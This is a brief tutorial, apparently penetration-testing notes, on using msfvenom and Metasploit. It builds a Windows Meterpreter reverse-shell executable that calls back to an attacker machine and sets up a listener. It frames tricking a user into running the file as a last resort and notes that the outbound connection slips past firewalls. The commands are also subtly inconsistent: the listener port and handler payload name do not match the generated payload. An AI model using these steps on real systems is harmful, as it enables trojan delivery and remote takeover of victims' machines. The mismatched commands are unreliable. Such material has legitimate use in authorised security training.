# Msfvenom

Okay, so you have failed to discover any vulnerabilites in the system you are attacking. Fear not, there is still a last resort. Usually the weakest link: **the user**.

With msfvenom we are able to create exploits that we can send to the target, and trick the target to click it. The program will then call our machine.

## Basics

List exploits
```
msfvenom -l
```

Add the `--payload-options` to see the options
```
msfvenom -p windows/meterpreter_reverse_http --payload-options
```





## Create exploit

Here we create a program that will call the attacker machine.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=4444 -f exe > payload.exe
```

## Start listening for exploit

So once an exploit is set we need to start to listen for it. We can do that using metasploit.

```
use exploit/multi/handler
```

Set what payload you want for the listening part
```
set payload exploit/meterpreter/reverse_tcp
```

Show options
```
show options
set LHOST 192.168.1.101
set LPORT 8080
exploit
```




This does indeed bypass the firewall. Since the connection is initiated from the inside. A firewall normally (maybe older firewalls) only block incoming, and not outgoing connections.